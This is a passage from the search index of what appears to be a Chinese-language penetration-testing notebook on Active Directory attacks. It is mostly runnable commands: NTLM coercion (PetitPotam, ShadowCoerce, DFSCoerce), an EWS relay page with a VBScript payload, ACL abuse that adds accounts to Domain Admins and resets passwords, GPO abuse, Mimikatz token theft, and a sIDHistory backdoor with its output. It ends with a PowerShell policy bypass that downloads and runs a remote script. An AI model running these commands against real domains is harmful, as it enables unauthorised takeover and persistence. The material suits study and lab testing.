\u53ef\u4ee5\u901a\u8fc7efsrpc\u548clsarpc\u89e6\u53d1\uff0c\u4f46efsrpc\u8f83\u4e0d\u5e38\u89c1\uff0clsarpc\u53ef\u4ee5\u572808\u548c12\u7684\u7cfb\u7edf\u4e0a\u533f\u540d\u89e6\u53d1\uff0c16\u4e0a\u9700\u8981\u4e00\u4e2a\u7528\u6237\u51ed\u636e\u89e6\u53d1\u3002\u662f\u5426\u9700\u8981\u4e00\u4e2a\u57df\u5185\u7528\u6237\u5bc6\u7801\u53d6\u51b3\u4e8e\u57df\u63a7\u7ec4\u7b56\u7565\u4e2d\u7684\"\u53ef\u533f\u540d\u8bbf\u95ee\u7684\u547d\u540d\u7ba1\u9053\"\u7684\u914d\u7f6e\u3002\u7ec4\u7b56\u7565\u4e0d\u4e3a\u7a7a\uff0c\u4e5f\u662f\u53ef\u4ee5\u89e6\u53d1\u7684\u3002 GitHub\u5730\u5740 \u57df\u7528\u6237\u89e6\u53d1 Petitpotam.py -u test -p asdmin123 -d exp1.com -pipe lsarpc 10.0.2.5 10.0.2.254 \u533f\u540d\u89e6\u53d1 python Petitpotam.py -pipe lsarpc 192.168.52.129 192.168.52.100","title":"MS-EFSRPC (PetitPotam)"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ms-fsrvp-shadowcoerce","text":"MS-FSRVP\u662fMicrosoft\u7684\u6587\u4ef6\u670d\u52a1\u5668\u8fdc\u7a0bVSS\u534f\u8bae\u3002\u5b83\u7528\u4e8e\u5728\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u521b\u5efa\u6587\u4ef6\u5171\u4eab\u7684\u5377\u5f71\u526f\u672c\uff0c\u4ee5\u53ca\u4fbf\u4e8e\u5907\u4efd\u5e94\u7528\u7a0b\u5e8f\u5728 SMB2 \u5171\u4eab\u4e0a\u6267\u884c\u5e94\u7528\u7a0b\u5e8f\u4e00\u81f4\u6027\u5907\u4efd\u548c\u6570\u636e\u8fd8\u539f\u3002 \u5229\u7528\u6761\u4ef6\u662f\u9700\u8981\u542f\u7528 \u6587\u4ef6\u670d\u52a1\u5668VSS\u4ee3\u7406\u670d\u52a1 python3 shadowcoerce.py -d \"exp1.com\" -u \"t1\" -p \"Aa123123\" 192.168.14.128 192.168.14.100","title":"MS-FSRVP (ShadowCoerce)"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#ms-dfsnmdfscoerce","text":"\u901a\u8fc7\u6307\u5b9a\u5206\u5e03\u5f0f\u6587\u4ef6\u7cfb\u7edf\u7684RPC\u7ba1\u9053netdfs\u6765\u8fdb\u884c\u5f3a\u5236\u4e2d\u7ee7\uff0c\u9700\u8981\u4e00\u4e2a\u57df\u7528\u6237\u548c\u5bc6\u7801\uff08\u6216hash\uff09 https://github.com/Wh04m1001/DFSCoerce 128\u662f\u76d1\u542c\uff0c100\u662f\u76ee\u6807 python dfscoerce.py -u a2 -p Aa123123 192.168.14.128 192.168.14.100","title":"MS-DFSNM\uff08DFSCoerce\uff09"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#relay2ews","text":"https://github.com/Arno0x/NtlmRelayToEWS homepage <html> <head> <meta http-equiv=\"Content-Language\" content=\"en-us\"> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1252\"> <title>Outlook</title> <script id=clientEventHandlersVBS language=vbscript> <!-- Sub window_onload() Set Application = ViewCtl1.OutlookApplication Set cmd = Application.CreateObject(\"Wscript.Shell\") cmd.Run(\"calc\") End Sub --> </script> </head> <body> <object classid=\"clsid:0006F063-0000-0000-C000-000000000046\" id=\"ViewCtl1\" data=\"\" width=\"100%\" height=\"100%\"></object> </body> </html>","title":"RELAY2EWS"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#relay2ldap","text":"\u9ad8\u6743\u9650\u7528\u6237 \u5982\u679cNTLM\u53d1\u8d77\u7528\u6237\u5728\u4ee5\u4e0b\u7528\u6237\u7ec4 Enterprise admins Domain admins Built-in Administrators Backup operators Account operators \u90a3\u4e48\u5c31\u53ef\u4ee5\u5c06\u4efb\u610f\u7528\u6237\u62c9\u8fdb\u8be5\u7ec4\uff0c\u4ece\u800c\u4f7f\u8be5\u7528\u6237\u79f0\u4e3a\u9ad8\u6743\u9650\u7528\u6237\uff0c\u6bd4\u5982\u57df\u7ba1 CVE-2019-1040","title":"RELAY2LDAP"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#acl_1","text":"\u4e00\u822c\u60c5\u51b5\u800c\u8a00\uff0c\u57df\u5185\u7684ACL\u5e94\u8be5\u4e0d\u4f1a\u6709\u7279\u522b\u611a\u8822\u7684\u914d\u7f6e\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u7684ACL\u90fd\u662f\u6b63\u5e38\u7684\uff0c\u6ca1\u6709\u529e\u6cd5\u53ef\u5229\u7528\uff0c\u800c\u4e14\u6539\u8d77\u6765\u4e5f\u6bd4\u8f83\u590d\u6742\uff0c\u7ba1\u7406\u5458\u4e00\u822c\u662f\u4e0d\u4f1a\u52a8\u7684\u3002\u4f46\u67d0\u4e9b\u6b63\u5e38\u7684\u8bbe\u7f6e\u53ef\u4ee5\u7528\u6765\u5f62\u6210\u653b\u51fb\u94fe\uff0c\u6700\u7ec8\u83b7\u53d6\u76ee\u6807\u6743\u9650\uff0c\u8fd9\u4e00\u70b9\u9700\u8981\u914d\u5408BH\u4f7f\u7528\u3002","title":"ACL\u7684\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#addmembers","text":"\u5b58\u5728AllExtendedRights, Self, WriteProperty, GenericWrite \u6216GenericAll\u65f6\u53ef\u5229\u7528 \u53ef\u4ee5\u5c06\u4efb\u610f\u7528\u6237\uff0c\u7ec4\u6216\u8ba1\u7b97\u673a\u6dfb\u52a0\u5230\u76ee\u6807\u7ec4\u3002 \u5047\u8bbett\u7528\u6237\u7528\u6237\u5bf9domain admins\u7ec4\u6709member\u6743\u9650\uff0c\u90a3\u4e48tt\u5c06\u62e5\u6709\u5bf9\u57df\u7ba1\u7ec4\u5199\u5165\u7528\u6237\u7684\u6743\u9650\u3002\u6362\u4e00\u53e5\u8bdd\u8bf4\uff0ctt\u5c31\u662f\u57df\u7ba1\u3002 \u67e5\u8be2domain admins\u7ec4\u6709\u54ea\u4e9bmember\u6743\u9650 AdFind.exe -users -rb CN=\"domain Admins\" -sc getacl -sddlfilter ;;;member;; \u67e5\u8be2tt\u7528\u6237\u5bf9\u54ea\u4e9b\u5bf9\u8c61\u6709member\u6743\u9650 AdFind.exe -b \"cn=tt,cn=users,dc=exp1,dc=com\" memberOf \u7ed9tt\u7528\u6237\u6dfb\u52a0\u57df\u7ba1\u7ec4\u7684member\u6743\u9650 adfind -users -rb CN=tt -dsq|admod -users -rb CN=\"Domain Admins\" -stdinadd member Powerview\u6dfb\u52a0 Add-DomainGroupMember\u65b9\u6cd5 \u5c06tt\u7528\u6237\u52a0\u5165\u57df\u7ba1\u7ec4 Add-DomainGroupMember -Identity 'Domain Admins' -Members 'tt' net group 'Domain Admins' 'user' /add /domain # Powershell: Active Directory module Add-ADGroupMember -Identity 'Domain Admins' -Members 'user' # Powershell: PowerSploit module Add-DomainGroupMember -Identity 'Domain Admins' -Members 'user' linux # \u7a97\u8f93\u5165\u5bc6\u7801 net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController # With net and cleartext credentials net rpc group addmem 'domain admins' a1 -U exp1.com/tt%Aa123123 -S 192.168.14.100 # With Pass-the-Hash pth-net rpc group addmem $TargetGroup $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController","title":"AddMembers"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#force-change-password","text":"AllExtendedRights\u3001GenericAll \u53ef\u4ee5\u5728\u4e0d\u77e5\u9053\u5f53\u524d\u76ee\u6807\u7528\u6237\u7684\u5bc6\u7801\u7684\u60c5\u51b5\u4e0b\u66f4\u6539\u76ee\u6807\u7528\u6237\u7684\u5bc6\u7801 \u67e5\u8be2 AdFind.exe -b \"cn=administrator,cn=users,dc=exp1,dc=com\" -sc getacl -sddlfilter ;;;password;; admod\u66f4\u6539 admod -b CN=Administrator,CN=Users,DC=exp1,DC=com unicodepwd::123!@#qazwsx -optenc powerview\u66f4\u6539 Set-DomainUserPassword\u65b9\u6cd5 \u8981\u6ce8\u610f\u7684\u662f\uff0c\u4e0d\u80fd\u76f4\u63a5\u8f93\u5165\u660e\u6587\u5bc6\u7801\uff0c\u9700\u8981\u8f6c\u6362\u4ee5\u4e0b\u5b57\u7b26\u7c7b\u578b $pass = ConvertTo-SecureString 'Aa123123' -AsPlainText -Force Set-DomainUserPassword -Identity tt -AccountPassword $pass Linux # \u5f39\u7a97\u8f93\u5165\u5bc6\u7801 net rpc password $TargetUser -U $DOMAIN/$ControlledUser -S $DomainController # With net and cleartext credentials net rpc password $TargetUser -U $DOMAIN/$ControlledUser%$Password -S $DomainController # With Pass-the-Hash pth-net rpc password $TargetUser -U $DOMAIN/$ControlledUser%ffffffffffffffffffffffffffffffff:$NThash -S $DomainController","title":"Force-Change-Password"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dcsyncacl","text":"DS-Replication-Get-Changes 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 DS-Replication-Get-Changes-All 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 \u5bf9\u57df\u5bf9\u8c61\u5177\u6709\u8fd9\u4e24\u4e2a\u6269\u5c55\u6743\u9650\u7684\u7528\u6237\u5177\u5907dcsync \u6743\u9650","title":"Dcsync\u7684ACL"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#allextendedrights","text":"\u6267\u884c\u4e0e\u5bf9\u8c61\u7684\u6269\u5c55Active Directory\u6743\u9650\u76f8\u5173\u8054\u7684\u4efb\u4f55\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5c06\u4e3b\u4f53\u6dfb\u52a0\u5230\u7ec4\u5e76\u5f3a\u5236\u66f4\u6539\u76ee\u6807\u7528\u6237\u7684\u5bc6\u7801\u90fd\u662f\u6269\u5c55\u6743\u9650\u7684\u4f7f\u7528\u793a\u4f8b","title":"AllExtendedRights"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#writedacl","text":"\u5c06\u65b0ACE\u5199\u5165\u76ee\u6807\u5bf9\u8c61\u7684DACL\u7684\u529f\u80fd\u3002 \u4f8b\u5982\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5411\u76ee\u6807\u5bf9\u8c61DACL\u5199\u5165\u65b0\u7684ACE\uff0c\u4ece\u800c\u4f7f\u653b\u51fb\u8005\u53ef\u4ee5\u201c\u5b8c\u5168\u63a7\u5236\u201d\u76ee\u6807\u5bf9\u8c61\u76f4\u63a5dcsync \u4f7f\u7528New-ADObjectAccessControlEntry\u65b9\u6cd5","title":"WriteDacl"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#genericwrite","text":"\u66f4\u65b0\u4efb\u4f55\u672a\u53d7\u4fdd\u62a4\u7684\u76ee\u6807\u5bf9\u8c61\u7684\u53c2\u6570\u503c\u3002\u4f8b\u5982\uff0c\u66f4\u65b0\u76ee\u6807\u7528\u6237\u5bf9\u8c61\u4e0a\u7684\u201cscriptPath\u201d\u53c2\u6570\u503c\uff0c\u53ef\u4ee5\u4f7f\u8be5\u7528\u6237\u5728\u4e0b\u6b21\u767b\u5f55\u65f6\u8fd0\u884c\u6307\u5b9a\u7684\u53ef\u6267\u884c\u6587\u4ef6\u6216\u547d\u4ee4 Powerview\u4f7f\u7528 Set-DomainObject pc1 -Set @{'mstsinitialprogram'='\\\\192.168.52.129\\share\\calc.exe'} -Verbose","title":"GenericWrite"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#writeowner","text":"\u66f4\u65b0\u76ee\u6807\u5bf9\u8c61\u6240\u6709\u8005 Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y Set the owner of 'dfm' in the current domain to 'harmj0y'.","title":"WriteOwner"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_71","text":"","title":"\u7ec4\u7b56\u7565\u76f8\u5173"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dc","text":"DC\u53ef\u4ee5\u63a7\u5236\u57df\u5185\u6240\u6709\u8ba1\u7b97\u673a\u7684\u7ec4\u7b56\u7565\u3002 \u8f93\u5165gpmc.msc\uff0c\u542f\u52a8\u7ec4\u7b56\u7565\u7ba1\u7406\uff0c\u754c\u9762\u5982\u4e0b\u56fe\u6240\u793a \u8fd9\u91cc\u6709\u4e00\u4e2a\u903b\u8f91\u3002\u7ec4\u7b56\u7565\u5bf9\u8c61\u53ea\u662f\u4e00\u6761\u4e00\u6761\u7684\u89c4\u5219\uff0c\u8fd9\u4e9b\u89c4\u5219\u672c\u8eab\u4e0d\u751f\u6548\uff0c\u9700\u8981\u628a\u8fd9\u4e9b\u89c4\u5219\u94fe\u63a5\u5230\u5bf9\u8c61\u4e2d\u624d\u4f1a\u751f\u6548\u3002\u4e00\u4e2a\u5bf9\u8c61\u53ef\u4ee5\u94fe\u63a5\u591a\u6761\u89c4\u5219\uff0c\u8fd9\u91cc\u5bf9\u8c61\u6700\u5c0f\u5355\u4f4d\u662f\u7ec4\u7ec7\u5355\u4f4d\uff0c\u6700\u5927\u662f\u6574\u4e2a\u6797\u3002 \u5f53\u7ec4\u7b56\u7565\u914d\u7f6e\u751f\u6548\u540e\uff0cDC\u4f1a\u66f4\u65b0\u7ec4\u7b56\u7565\u5e94\u7528\u5230\u81ea\u8eab\u3002 \u8fd9\u91cc\u53ef\u4ee5\u4e0b\u53d1\u8ba1 \u5212\u4efb\u52a1 \u8fd9\u91cc\u53ef\u4ee5\u4e0b\u53d1\u7a0b\u5e8f\uff0c\u53ea\u80fd\u662fmsi\u7684 \u8fd8\u6709\u542f\u52a8\u811a\u672c \u8fd8\u53ef\u4ee5\u6dfb\u52a0\u57df\u7528\u6237\u5230\u7ba1\u7406\u5458\u7ec4","title":"DC\u4e0a\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#dc_1","text":"\u5728\u6ca1\u6709\u83b7\u53d6DC\u6743\u9650\u4e4b\u524d\uff0c\u53ef\u4ee5\u7528adfind\u67e5\u8be2\u7ec4\u7b56\u7565\u7684\u6743\u9650\uff0c\u5982\u6709\u914d\u7f6e\u9519\u8bef\u7684\u6743\u9650\uff0c\u5219\u53ef\u4ee5\u8fdb\u884c\u5229\u7528\u3002 \u67e5\u8be2\u7ec4\u7b56\u7565\u7684\u8def\u5f84 adfind -b CN=Policies,CN=System,DC=exp1,DC=com -sddl+++ -s subtree -sdna -sddlfilter ;;;gPCFileSysPath;; -recmute gPCFileSysPath \u67e5\u8be2GPOname adfind -b CN=Policies,CN=System,DC=exp1,DC=com -sddl+++ -s subtree -sdna -sddlfilter ;;;gPCFileSysPath;; -recmute displayName \u67e5\u8be2\u6743\u9650 icacls \\\\exp1.com\\sysvol\\exp1.com\\Policies\\* \u5982\u83b7\u53d6\u5230\u4e86\u53ef\u4ee5\u5bf9GPO\u6709W\u6743\u9650\u7684\u8d26\u53f7\uff0c\u90a3\u4e48\u5c31\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u4fee\u6539 SharpGPOAbuse \u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u8fdb\u884c\u4e0b\u53d1\u7a0b\u5e8f\u3001\u6dfb\u52a0\u8ba1\u5212\u4efb\u52a1\u548c\u542f\u52a8\u811a\u672c\u4e4b\u7c7b\u7684\u64cd\u4f5c\u3002","title":"\u975eDC\u4e0a\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#mimikatz_5","text":"","title":"Mimikatz"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_72","text":"token::whoami\uff1a\u5217\u51fa\u5f53\u524d\u8fdb\u7a0b/\u7ebf\u7a0b\u7684token\u4fe1\u606f token::list\uff1a\u5217\u51fa\u5f53\u524d\u7cfb\u7edf\u4e2d\u5b58\u5728\u7684token token::elevate\uff1a\u7a83\u53d6\u5176\u4ed6\u7528\u6237\u7684token token::run\uff1a\u5229\u7528\u67d0\u7528\u6237\u6743\u9650\u8fd0\u884c\u6307\u5b9a\u7a0b\u5e8f token::revert\uff1a\u6062\u590d\u4e3a\u539f\u6765\u7684token \u4f7f\u7528TokenTest.exe\u8fdb\u884c\u4ee4\u724c\u64cd\u4f5c\uff0c\u53ef\u5347\u6743\u3001\u964d\u6743\u64cd\u4f5c\u3002 Intro: A demo written for learning windows access token. Author: @Loong716 Usage: TokenTest.exe whoami [/full] TokenTest.exe list TokenTest.exe steal <pid> <command> [/interactive | /echo]","title":"\u4ee4\u724c\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#sid_1","text":"SID\u4e00\u822c\u7531\u4ee5\u4e0b\u7ec4\u6210\uff1a \u201cS\u201d\u8868\u793aSID\uff0cSID\u59cb\u7ec8\u4ee5S\u5f00\u5934 \u201c1\u201d\u8868\u793a\u7248\u672c\uff0c\u8be5\u503c\u59cb\u7ec8\u4e3a1 \u201c5\u201d\u8868\u793aWindows\u5b89\u5168\u6743\u5a01\u673a\u6784 \u201c21-1463437245-1224812800-863842198\u201d\u662f\u5b50\u673a\u6784\u503c\uff0c\u901a\u5e38\u7528\u6765\u8868\u793a\u5e76\u533a\u5206\u57df \u201c1128\u201d\u4e3a\u76f8\u5bf9\u6807\u8bc6\u7b26(RID)\uff0c\u5982\u57df\u7ba1\u7406\u5458\u7ec4\u7684RID\u4e3a512 SIDHistory\u662f\u4e3a\u4e86\u652f\u6301\u57df\u8fc1\u79fb\u51fa\u73b0\u7684\uff0cobjectSid\u548cSIDHistory\u4e3a\u540c\u7c7b\u578b\u6570\u636e\uff0c\u5f53\u4e00\u4e2a\u7528\u6237\u7684SIDHistory\u662f\u5176\u4ed6\u7528\u6237\u7684objectSid\u65f6\uff0c\u8fd9\u4e2a\u7528\u6237\u5c31\u5177\u6709\u5176\u4ed6\u7528\u6237\u7684\u6743\u9650\u3002 \u4fee\u6539SIDHistory\u53ef\u7528\u6765\u7559\u540e\u95e8 sid::lookup \u8be5\u529f\u80fd\u5b9e\u73b0SID\u4e0e\u5bf9\u8c61\u540d\u4e4b\u95f4\u7684\u76f8\u4e92\u8f6c\u6362\uff0c\u6709\u4e09\u4e2a\u53c2\u6570\uff1a /name\uff1a\u6307\u5b9a\u5bf9\u8c61\u540d\uff0c\u5c06\u5176\u8f6c\u6362\u4e3aSID /sid\uff1a\u6307\u5b9aSID\uff0c\u5c06\u5176\u8f6c\u6362\u4e3a\u5bf9\u8c61\u540d /system\uff1a\u6307\u5b9a\u67e5\u8be2\u7684\u76ee\u6807\u8ba1\u7b97\u673a sid::query \u8be5\u529f\u80fd\u652f\u6301\u901a\u8fc7SID\u6216\u5bf9\u8c61\u540d\u6765\u67e5\u8be2\u5bf9\u8c61\u7684\u4fe1\u606f\uff0c\u540c\u6837\u6709\u4e09\u4e2a\u53c2\u6570\uff0c\u4f7f\u7528\u65f6\u6307\u5b9a/sam\u6216/sid\uff0c/system\u53ef\u9009 /sam\uff1a\u6307\u5b9a\u8981\u67e5\u8be2\u5bf9\u8c61\u7684sAMAccountName /sid\uff1a\u6307\u5b9a\u8981\u67e5\u8be2\u5bf9\u8c61\u7684objectSid /system\uff1a\u6307\u5b9a\u67e5\u8be2\u7684\u76ee\u6807\u57df\u63a7\uff08LDAP\uff09 sid::modify \u8be5\u529f\u80fd\u7528\u4e8e\u4fee\u6539\u4e00\u4e2a\u57df\u5bf9\u8c61\u7684SID\uff0c\u53ef\u4ee5\u4f7f\u7528\u7684\u53c2\u6570\u6709\u4e09\u4e2a\uff1a /sam\uff1a\u901a\u8fc7sAMAccountName\u6307\u5b9a\u8981\u4fee\u6539SID\u7684\u5bf9\u8c61 /sid\uff1a\u901a\u8fc7objectSid\u6307\u5b9a\u8981\u4fee\u6539SID\u7684\u5bf9\u8c61 /new\uff1a\u8981\u4fee\u6539\u5bf9\u8c61\u7684\u65b0SID \u4f7f\u7528\u8be5\u529f\u80fd\u662f\u9700\u8981\u5148\u4f7f\u7528sid::patch\u529f\u80fd\u5bf9xxxx\u8fdb\u884cpatch\uff08\u81ea\u7136\u4e5f\u9700\u8981\u5148\u5f00\u542fdebug\u7279\u6743\uff09\uff0c\u9700\u8981\u5728\u57df\u63a7\u4e0a\u6267\u884c\u3002 sid::add \u8be5\u529f\u80fd\u7528\u6765\u5411\u4e00\u4e2a\u57df\u5bf9\u8c61\u6dfb\u52a0sIDHistoy\u5c5e\u6027\uff0c\u6709\u4e24\u4e2a\u53c2\u6570\uff1a /sam\uff1a\u901a\u8fc7sAMAccountName\u6307\u5b9a\u8981\u4fee\u6539\u7684\u5bf9\u8c61 /sid\uff1a\u901a\u8fc7objectSid\u6307\u5b9a\u8981\u4fee\u6539\u7684\u5bf9\u8c61 /new\uff1a\u8981\u4fee\u6539sIDHistory\u4e3a\u54ea\u4e2a\u5bf9\u8c61\u7684SID\uff0c\u8be5\u53c2\u6570\u53ef\u6307\u5b9a\u76ee\u6807\u7684sAMAccountName\u6216objectSid\uff0c\u5f53\u6307\u5b9a\u540d\u79f0\u65f6\u4f1a\u5148\u8c03\u7528LookupAccountSid\u5c06\u5176\u8f6c\u6362\u4e3aSID \u4f7f\u7528\u8be5\u529f\u80fd\u4e5f\u8981\u5148\u6267\u884csid::patch\uff0c\u4fee\u6539\u65f6\u540c\u6837\u662f\u64cd\u4f5cLDAP\u901a\u8fc7ldap_modify_s()\u4fee\u6539\uff0c\u4e0d\u518d\u8d58\u8ff0 \u5229\u7528sIDHistory\u6765\u7559\u540e\u95e8 mimikatz # sid::patch mimikatz # sid::add /sam:a1 /new:administrator CN=a1,CN=Users,DC=exp1,DC=com name: a1 objectGUID: {366db2c4-a05a-4617-bd33-789aa90ea20f} objectSid: S-1-5-21-3280894980-4031048059-2076154112-1106 sAMAccountName: a1 * Will try to add 'sIDHistory' this new SID:'S-1-5-21-3280894980-4031048059-2076154112-500': OK! mimikatz # sid::query /sam:a1 CN=a1,CN=Users,DC=exp1,DC=com name: a1 objectGUID: {366db2c4-a05a-4617-bd33-789aa90ea20f} objectSid: S-1-5-21-3280894980-4031048059-2076154112-1106 sAMAccountName: a1 sIDHistory: [0] S-1-5-21-3280894980-4031048059-2076154112-500 ( User -- EXP1\\Administrator ) sid::clear \u8be5\u529f\u80fd\u7528\u6765\u6e05\u7a7a\u4e00\u4e2a\u5bf9\u8c61\u7684sIDHistory\u5c5e\u6027 /sam\uff1a\u8981\u6e05\u7a7asIDHistory\u7684\u5bf9\u8c61\u7684sAMAccountName /sid\uff1a\u8981\u6e05\u7a7asIDHistory\u7684\u5bf9\u8c61\u7684objectSid sid::patch \u7b2c\u4e00\u6b65\u6210\u529f\uff1a\u53ef\u4f7f\u7528add \u7b2c\u4e8c\u6b65\u6210\u529f\uff1a\u53ef\u4f7f\u7528modify","title":"SID\u6a21\u5757"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_73","text":"","title":"\u7279\u6743\u5229\u7528"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#sedebugprivilege","text":"\u53ef\u4ee5\u5bf9\u5176\u4ed6\u7528\u6237\u8fdb\u884c\u8c03\u8bd5\uff0c\u7528\u4e8e\u63d0\u6743","title":"SeDebugPrivilege"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#sebackupprivilege","text":"\u53ef\u4ee5\u8fdb\u884c\u5907\u4efd\u64cd\u4f5c\uff0c\u5bf9\u6240\u6709\u6587\u4ef6\u6709\u8bfb\u53d6\u6743\u9650","title":"SeBackupPrivilege"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#serestoreprivilege","text":"\u53ef\u4ee5\u8fdb\u884c\u8fd8\u539f\u64cd\u4f5c\uff0c\u5bf9\u6240\u6709\u6587\u4ef6\u6709\u5199\u6743\u9650\u3002\u57df\u5185 Backup Operators \u548c Server Operators \u7ec4\u4e5f\u6709\u8be5\u6743\u9650\u3002","title":"SeRestorePrivilege"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#setakeownershipprivilege","text":"\u4fee\u6539\u4efb\u610f\u5bf9\u8c61\u7684\u6240\u6709\u6743","title":"SeTakeOwnershipPrivilege"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#selmpersonateprivilege","text":"\u5141\u8bb8\u8be5\u7528\u6237\u8fd0\u884c\u7684\u7a0b\u5e8f\u6a21\u62df\u5ba2\u6237\u7aef","title":"SelmpersonatePrivilege"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#seassignprimarytokenprivilege","text":"\u8868\u793a\u53ef\u4ee5\u4e3a\u8fdb\u7a0b\u5206\u914d\u4e3b\u4ee4\u724c","title":"SeAssignPrimaryTokenPrivilege"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#seloaddriverprivilege","text":"\u7528\u6765\u52a0\u8f7d\u6216\u5378\u8f7d\u8bbe\u5907\u7684\u9a71\u52a8","title":"SeLoadDriverPrivilege"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#bloodhound","text":"BH\u53ef\u4ee5\u81ea\u52a8\u5316\u641c\u96c6\u57df\u5185\u6240\u6709\u4fe1\u606f\uff0c\u5e76\u6839\u636e\u641c\u96c6\u5230\u7684\u4fe1\u606f\u8fdb\u884c\u5206\u6790\uff0c\u7136\u540e\u63d0\u4f9b\u6709\u6548\u7684\u653b\u51fb\u8def\u5f84\u3002","title":"BloodHound"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_74","text":"\u8be6\u7ec6\u6d41\u7a0b\u89c1 \u5b98\u65b9\u6587\u6863 \u3002\u603b\u7684\u5c31\u662f\u8981\u88c5java\u548cneoj4\uff0c\u5e76\u4e14\u6bcf\u6b21\u542f\u52a8BH\u65f6\u5148\u8981\u542f\u52a8neo4j\u3002 \u542f\u52a8neoj4 /usr/bin/neo4j console \u542f\u52a8BH\uff0c\u5728BH\u89e3\u538b\u76ee\u5f55\u76f4\u63a5\u542f\u52a8 ./BloodHound --no-sandbox neoj4\u53ef\u4ee5\u5b89\u88c5\u5728vm\u4e2d\uff0cBH\u5e73\u53f0\u53ef\u4ee5\u76f4\u63a5\u5728\u672c\u5730\u7535\u8111\u4e2d\u8fd0\u884c\uff0c\u4f46\u9700\u8981\u6539\u4e00\u4e0bneoj4\u76d1\u542c\u5730\u5740\u3002","title":"\u5b89\u88c5&amp;\u542f\u52a8"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_75","text":"\u542f\u52a8BH\u540e\uff0c\u4f1a\u5f39\u51fa\u56fe\u5f62\u754c\u9762\u3002\u8f93\u5165neoj4\u7684\u5bc6\u7801\uff0c\u9ed8\u8ba4\u662fneoj4/neoj4\u3002","title":"\u5206\u6790\u5e73\u53f0"},{"location":"%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%B8%97%E9%80%8F/#_76","text":"\u7528PS1\u811a\u672c\u6216EXE\u641c\u96c6\uff0c\u76f4\u63a5\u8fd0\u884c\u540e\uff0c\u4f1a\u5728\u5f53\u524d\u76ee\u5f55\u751f\u6210\u4e00\u4e2azip\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u7ed5\u8fc7powershell\u7b56\u7565 PowerShell -Exec Bypass powershell IEX (New-Object Net.WebClient).DownloadString('http://1.1.1.:8000/SharpHound.ps1');Invoke-BloodHound -CollectionMethod All SharpHound.exe -c 